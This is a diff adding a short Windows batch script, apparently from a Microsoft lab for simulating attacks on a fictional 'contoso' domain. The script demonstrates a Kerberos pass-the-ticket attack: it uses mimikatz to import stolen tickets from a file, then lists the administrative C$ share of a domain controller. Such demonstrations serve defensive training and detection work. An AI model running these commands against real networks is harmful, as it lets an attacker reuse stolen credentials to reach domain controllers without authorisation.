@@ -1,0 +1,17 @@
+:: Copyright (c) Microsoft Corporation.  
+:: Licensed under the MIT license.
+
+:: prove dont have access
+dir \\contosodc\c$
+pause
+klist
+pause
+:: pass nuckc ticket
+c:\tools\mimikatz\x64\mimikatz.exe "privilege::debug" "kerberos::ptt c:\temp\adminpc_tickets" "exit"
+pause
+:: prove ticket was imported
+klist
+pause
+:: access DC
+dir \\contosodc\c$
+pause
